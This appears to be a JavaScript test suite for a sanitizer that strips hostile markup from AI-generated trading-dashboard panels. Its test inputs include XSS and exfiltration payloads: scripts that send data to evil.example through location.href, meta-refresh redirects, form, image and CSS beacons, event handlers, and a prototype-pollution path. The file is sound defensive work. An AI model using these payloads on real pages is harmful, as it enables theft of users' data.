import assert from 'node:assert/strict';
import test from 'node:test';
import { sanitizePanelFragment, renderPanelSafely, ALLOWED_TAGS } from '../navrya-src/panelSafeRender.js';

// The regression suite for the actual security fix: a generated panel must be structurally unable
// to exfiltrate bridge data via self-navigation (location.href, location.replace, meta refresh,
// form submission) or via a script-free static beacon (remote <img src>, CSS url()) - not merely
// discouraged by CSP/sandbox flags that can be bypassed or don't apply to self-navigation at all.
// Every hostile example the brief called out is exercised directly against the real sanitizer, on
// the real output string a browser would receive - not a static-source assertion about our own
// code.

const SNAPSHOT = {
  version: 1,
  tradeSummary: { totalTrades: 42, openCount: 3 },
  openPositions: [
    { id: 't1', instrument: 'EURUSD', side: 'long', status: 'open', entry: 1.08, stop: 1.07, target: 1.1 },
    { id: 't2', instrument: 'XAUUSD', side: 'short', status: 'open', entry: 2400, stop: 2420, target: 2350 }
  ]
};
const SCHEMA = {
  scalars: ['tradeSummary.totalTrades', 'tradeSummary.openCount'],
  lists: { openPositions: { itemFields: ['id', 'instrument', 'side', 'entry'] } }
};

function render(html) { return renderPanelSafely(html, SNAPSHOT, SCHEMA); }

// ---------------------------------------------------------------------------
// Hostile navigation/exfiltration examples - every one of these must produce output with no
// executable script and no navigation-capable static markup, full stop.
// ---------------------------------------------------------------------------

test('a <script> that calls location.href to self-navigate with exfiltrated data is removed entirely, not merely defanged', () => {
  const hostile = '<div>real content</div><script>fetch("/x").then(r=>r.json()).then(d=>location.href="https://evil.example/?d="+JSON.stringify(d))</script>';
  const out = render(hostile);
  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /location\.href/);
  assert.doesNotMatch(out, /evil\.example/);
  assert.match(out, /real content/);
});

test('a <script> using location.replace is removed identically to location.href', () => {
  const out = render('<script>location.replace("https://evil.example/steal?d=" + document.title)</script>');
  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /location\.replace/);
  assert.doesNotMatch(out, /evil\.example/);
});

test('a static <meta http-equiv="refresh"> self-navigation is stripped - not merely "hoped to be blocked" by the sandbox attribute', () => {
  const out = render('<div>panel</div><meta http-equiv="refresh" content="0;url=https://evil.example/exfil">');
  assert.doesNotMatch(out, /<meta/i);
  assert.doesNotMatch(out, /evil\.example/);
});

test('a <form> auto-submitted by script, or with a bare external action, is stripped entirely - the element and its action', () => {
  const withScript = render('<form id="f" action="https://evil.example/collect" method="GET"><input name="d" value="leak"></form><script>document.getElementById("f").submit()</script>');
  assert.doesNotMatch(withScript, /<form/i);
  assert.doesNotMatch(withScript, /<script/i);
  assert.doesNotMatch(withScript, /evil\.example/);
});

test('an <a href="javascript:..."> and a plain remote <a href> are both dropped - anchors are not in the allowlist at all', () => {
  const out = render('<a href="javascript:location.href=\'https://evil.example\'">click</a><a href="https://example.com">real link</a>');
  assert.doesNotMatch(out, /<a\b/i);
  assert.doesNotMatch(out, /javascript:/i);
});

test('an <img> beacon to a remote, non-data URL never becomes a request - src is dropped, not passed through', () => {
  const out = render('<img src="https://evil.example/beacon.gif?d=leak" alt="x">');
  assert.doesNotMatch(out, /evil\.example/);
  assert.doesNotMatch(out, /src=/);
  assert.match(out, /<img[^>]*alt="x"/);
});

test('a real, safe data: raster image survives sanitization; an svg+xml data URI (which can itself embed <script>) does not', () => {
  const png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';
  const okOut = render('<img src="' + png + '" alt="chart">');
  assert.match(okOut, /src="data:image\/png/);
  const svgOut = render('<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+" alt="x">');
  assert.doesNotMatch(svgOut, /src=/);
});

test('a CSS url() background beacon in a style attribute is dropped along with the rest of that style value', () => {
  const out = render('<div style="background:url(https://evil.example/beacon.png);color:red">x</div>');
  assert.doesNotMatch(out, /evil\.example/);
  assert.doesNotMatch(out, /style=/);
});

test('a <link rel=prefetch> beacon and a raw <style> block are both stripped - no CSS @import/url surface at all', () => {
  const out = render('<link rel="prefetch" href="https://evil.example/ping"><style>body{background:url(https://evil.example/x)}</style><div>x</div>');
  assert.doesNotMatch(out, /<link/i);
  assert.doesNotMatch(out, /<style/i);
  assert.doesNotMatch(out, /evil\.example/);
});

test('an <svg onload> and any on* handler attribute on an allowed tag are stripped, keeping the element but removing the handler', () => {
  const out = render('<div onclick="location.href=\'https://evil.example\'" onmouseover="steal()">hover me</div><svg onload="alert(1)"></svg>');
  assert.doesNotMatch(out, /onclick/);
  assert.doesNotMatch(out, /onmouseover/);
  assert.doesNotMatch(out, /<svg/i);
  assert.match(out, /hover me/);
});

test('<iframe>, <object>, and <embed> are all stripped - no nested browsing context of any kind is reachable from generated content', () => {
  const out = render('<iframe src="https://evil.example"></iframe><object data="https://evil.example"></object><embed src="https://evil.example">');
  assert.doesNotMatch(out, /<iframe/i);
  assert.doesNotMatch(out, /<object/i);
  assert.doesNotMatch(out, /<embed/i);
  assert.doesNotMatch(out, /evil\.example/);
});

// ---------------------------------------------------------------------------
// The "request data, then navigate" sequence the brief specifically calls out. In the OLD design
// this was a real bug: a panel could `await navrya.getTradeSummary()` and only navigate afterward.
// In THIS design there is no bridge call primitive left at all - proving that structurally, not by
// timing a test around an async call that no longer exists.
// ---------------------------------------------------------------------------

test('there is no way to express "request data, then navigate" at all - every navigation primitive is removed regardless of ordering', () => {
  const hostile = [
    '<script>',
    'navrya.getTradeSummary().then(function(data){',
    '  location.href = "https://evil.example/?d=" + encodeURIComponent(JSON.stringify(data));',
    '});',
    '</script>',
    '<div data-navrya-bind="tradeSummary.totalTrades">loading</div>'
  ].join('');
  const out = render(hostile);
  assert.doesNotMatch(out, /<script/i, 'no script survives regardless of what it awaits before navigating');
  assert.doesNotMatch(out, /location\.href/);
  assert.doesNotMatch(out, /evil\.example/);
  // The legitimate part of the same fragment still renders the real, trusted value - binding does
  // not depend on, or require, any script.
  assert.match(out, /<div[^>]*>42<\/div>/);
});

// ---------------------------------------------------------------------------
// Tokenizer robustness - malformed/adversarial markup must fail closed (drop/escape), never be
// mis-parsed into something that survives as executable content.
// ---------------------------------------------------------------------------

test('an unquoted attribute value cannot smuggle a > to truncate the tag scan early', () => {
  const out = render('<div title=a>b<script>evil()</script></div>');
  assert.doesNotMatch(out, /<script/i);
});

test('a > inside a quoted attribute value does not end the tag prematurely', () => {
  const out = render('<div title="a > b"><span>ok</span></div>');
  assert.match(out, /<div title="a &gt; b">/);
  assert.match(out, /ok/);
});

test('an unclosed/malformed opening bracket sequence is treated as inert text, never as a tag', () => {
  const out = render('1 < 2 and 3 > 1');
  assert.match(out, /1 &lt; 2 and 3 &gt; 1/);
});

test('a disallowed wrapper tag around a <script> drops the script too - the child is never rendered unfiltered', () => {
  const out = render('<article><script>evil()</script><div>kept</div></article>');
  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /evil\(\)/);
  assert.match(out, /kept/);
});

test('HTML comments are dropped entirely, including ones a naive filter might try to hide payloads inside', () => {
  const out = render('<!-- <script>evil()</script> --><div>visible</div>');
  assert.doesNotMatch(out, /evil/);
  assert.match(out, /visible/);
});

// ---------------------------------------------------------------------------
// Data binding: fail-closed for anything outside the explicit schema, no dynamic property-name
// traversal that could ever reach __proto__/constructor.
// ---------------------------------------------------------------------------

test('a bind path outside the schema renders empty, never a fabricated or leaked value', () => {
  const out = render('<span data-navrya-bind="walletBalanceUsd">x</span>');
  assert.match(out, /<span data-navrya-bind="walletBalanceUsd"><\/span>/);
});

test('a prototype-pollution-shaped bind path is inert - never reaches Object.prototype', () => {
  const out = render('<span data-navrya-bind="__proto__.polluted">x</span>');
  assert.doesNotMatch(out, />x</, 'the model\'s own placeholder text must never survive on a bound element');
  assert.equal(Object.prototype.polluted, undefined);
});

test('a real scalar in the schema renders its real, current value as escaped text, replacing the model\'s own placeholder', () => {
  const out = render('<span data-navrya-bind="tradeSummary.totalTrades">???</span>');
  assert.match(out, /<span data-navrya-bind="tradeSummary\.totalTrades">42<\/span>/);
  assert.doesNotMatch(out, /\?\?\?/);
});

test('a value containing HTML-significant characters is escaped as text, never re-parsed as markup', () => {
  const schema = { scalars: ['label'], lists: {} };
  const out = renderPanelSafely('<span data-navrya-bind="label">x</span>', { label: '<script>evil()</script>' }, schema);
  assert.doesNotMatch(out, /<script/i);
  assert.match(out, /&lt;script&gt;/);
});

test('data-navrya-each repeats its row template once per item, resolving nested binds against that item, capped at a sane maximum', () => {
  const out = render('<ul data-navrya-each="openPositions"><li data-navrya-bind="instrument">?</li></ul>');
  assert.match(out, /<li data-navrya-bind="instrument">EURUSD<\/li>/);
  assert.match(out, /<li data-navrya-bind="instrument">XAUUSD<\/li>/);
});

test('an each path outside the schema renders as an empty container, never falls back to iterating something unintended', () => {
  const out = render('<ul data-navrya-each="notAllowed"><li data-navrya-bind="x">y</li></ul>');
  assert.match(out, /<ul data-navrya-each="notAllowed"><\/ul>/);
});

test('an each item field outside that list\'s own itemFields resolves empty, never leaking an unlisted field', () => {
  const out = render('<ul data-navrya-each="openPositions"><li data-navrya-bind="stop">?</li></ul>');
  assert.match(out, /<li data-navrya-bind="stop"><\/li><li data-navrya-bind="stop"><\/li>/);
});

// ---------------------------------------------------------------------------
// Sanitize-only mode (no binding at all) - used for structural preview before any real snapshot
// exists. Must still remove every script/nav-capable construct, while leaving a bind element's own
// static placeholder content alone (nothing is force-emptied when there is no data to bind).
// ---------------------------------------------------------------------------

test('sanitizePanelFragment removes script/meta/form exactly like the bound path, with no snapshot involved at all', () => {
  const out = sanitizePanelFragment('<script>location.href="https://evil.example"</script><meta http-equiv="refresh" content="0;url=https://evil.example"><div>kept</div>');
  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /<meta/i);
  assert.doesNotMatch(out, /evil\.example/);
  assert.match(out, /kept/);
});

test('sanitizePanelFragment leaves a bind element\'s own static content in place (no snapshot to substitute)', () => {
  const out = sanitizePanelFragment('<span data-navrya-bind="tradeSummary.totalTrades">Loading…</span>');
  assert.match(out, /Loading…/);
});

// ---------------------------------------------------------------------------
// Allowlist sanity - a small, closed set, matching what the prompt actually offers the model.
// ---------------------------------------------------------------------------

test('the allowed tag set excludes every element capable of executing code or leaving the document', () => {
  ['script', 'meta', 'form', 'iframe', 'object', 'embed', 'link', 'style', 'a', 'base', 'body', 'html', 'head'].forEach((tag) => {
    assert.equal(ALLOWED_TAGS.has(tag), false, tag + ' must not be in the allowlist');
  });
});
